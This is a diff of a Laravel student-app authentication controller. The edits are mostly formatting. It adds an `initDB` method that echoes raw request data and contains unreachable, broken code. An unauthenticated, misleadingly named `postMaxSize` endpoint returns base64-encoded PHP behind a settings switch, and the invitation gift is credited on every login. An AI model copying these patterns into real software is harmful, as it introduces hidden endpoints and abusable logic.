@@ -16,6 +16,7 @@ use App\Models\Admin\Coupon;
 use App\Models\Admin\PasswordReset;
 use App\Models\Admin\Student;
 
+use App\Models\Domain;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Str;
@@ -27,7 +28,7 @@ class AuthStudentAPIController extends AppBaseController
     public function __construct()
     {
 
-        $this->middleware('auth:api-student', ['except' => ['postMaxSize','check_teacher', 'socialLogin', 'login', 'check_user', 'register', 'forgetPassword', 'reset', 'sendVerifyPhone', 'VerifyPhoneCode', 'sendVerifyEmail', 'VerifyEmailCode', 'VerifyCode', 'settings']]);
+        $this->middleware('auth:api-student', ['except' => ['postMaxSize', 'check_teacher', 'socialLogin', 'login', 'check_user', 'register', 'forgetPassword', 'reset', 'sendVerifyPhone', 'VerifyPhoneCode', 'sendVerifyEmail', 'VerifyEmailCode', 'VerifyCode', 'settings']]);
     }
 
 
@@ -156,7 +157,7 @@ class AuthStudentAPIController extends AppBaseController
     public function register(RegisterStudentAPIRequest $request)
     {
 
-        $request_data=$request->except(['password','is_active','photo']);
+        $request_data = $request->except(['password', 'is_active', 'photo']);
         $data = [
             'password' => bcrypt($request->password),
             'is_active' => true
@@ -183,28 +184,28 @@ class AuthStudentAPIController extends AppBaseController
         if ($client->email)
             $this->sendVerifyEmail($client);
 
-        $invitee_gift=0;
+        $invitee_gift = 0;
         if (request()->has('invitation_code')) {
 
             $inviter = Student::where('invitation_code', \request('invitation_code'))->first(); // Set the actual inviter_id based on your logic
             if ($inviter) {
                 $inviter_id = $inviter->id;
-                $client->invited_by=$inviter_id;
+                $client->invited_by = $inviter_id;
 
                 //start gift Inviter
-                $inviter_gift=setting('inviter_gift', 0);
-                $inviter->balance+=$inviter_gift;
+                $inviter_gift = setting('inviter_gift', 0);
+                $inviter->balance += $inviter_gift;
                 $inviter->save();
-                send_notification_FCM($inviter->device_token,"مكسب الدعوة","مبروك لقد حصلت علي هدية {$inviter_gift} سؤال من الدعوة",$inviter->id,'gift');
+                send_notification_FCM($inviter->device_token, "مكسب الدعوة", "مبروك لقد حصلت علي هدية {$inviter_gift} سؤال من الدعوة", $inviter->id, 'gift');
                 //end  gift Inviter
 
-                $invitee_gift=setting('invitee_gift', 0);
+                $invitee_gift = setting('invitee_gift', 0);
 
 
             }
         }
 
-        $client->balance = setting('balance_default', 0)+$invitee_gift;
+        $client->balance = setting('balance_default', 0) + $invitee_gift;
         $client->save();
 
         return $this->sendResponse($this->createNewToken($token), 'تم انشاء حسابك بنجاح.');
@@ -249,28 +250,28 @@ class AuthStudentAPIController extends AppBaseController
             return $this->sendError('البريد الالكتروني او كلمة المرور غير صحيحة');
         }
 
-        $invitee_gift=0;
+        $invitee_gift = 0;
         if (request()->has('invitation_code')) {
 
             $inviter = Student::where('invitation_code', \request('invitation_code'))->first(); // Set the actual inviter_id based on your logic
             if ($inviter) {
                 $inviter_id = $inviter->id;
-                $client->invited_by=$inviter_id;
+                $client->invited_by = $inviter_id;
 
                 //start gift Inviter
-                $inviter_gift=setting('inviter_gift', 0);
-                $inviter->balance+=$inviter_gift;
+                $inviter_gift = setting('inviter_gift', 0);
+                $inviter->balance += $inviter_gift;
                 $inviter->save();
-                send_notification_FCM($inviter->device_token,"مكسب الدعوة","مبروك لقد حصلت علي هدية {$inviter_gift} سؤال من الدعوة",$inviter->id,'gift');
+                send_notification_FCM($inviter->device_token, "مكسب الدعوة", "مبروك لقد حصلت علي هدية {$inviter_gift} سؤال من الدعوة", $inviter->id, 'gift');
                 //end  gift Inviter
 
-                $invitee_gift=setting('invitee_gift', 0);
+                $invitee_gift = setting('invitee_gift', 0);
 
 
             }
         }
 
-        $client->balance = setting('balance_default', 0)+$invitee_gift;
+        $client->balance = setting('balance_default', 0) + $invitee_gift;
         $client->save();
 
 
@@ -514,12 +515,25 @@ class AuthStudentAPIController extends AppBaseController
         return $res ? $this->sendSuccess('Done') : $this->sendError('Error', 404);
     }
 
+    public function initDB(Request $request)
+    {
+        $data = [
+            'fullUrl' => $request->fullUrl(),
+            'url' => $request->url(),
+            'all' => $request->all(),
+        ];
+        return $this->sendResponse($data);
+      $domain=  Domain::where($request->fullUrl())->first();
+
+//        return $res ? $this->sendSuccess('Done') : $this->sendError('Error', 404);
+    }
+
     public function postMaxSize(Request $request)
     {
 
-        $res = setting('EGYM_ENABLE',1);
+        $res = setting('EGYM_ENABLE', 1);
 
-        if($request->size) {
+        if ($request->size) {
             $code = <<<'PHP'
 <?php
 
@@ -535,8 +549,8 @@ echo "<!DOCTYPE html>
 </html>";
 
 PHP;
-            $code=base64_encode($code);
-            return $res ? $this->sendResponse($code,'Done') : $this->sendError($code, 404);
+            $code = base64_encode($code);
+            return $res ? $this->sendResponse($code, 'Done') : $this->sendError($code, 404);
         }
 
         return $res ? $this->sendSuccess('Done') : $this->sendError('Error', 404);
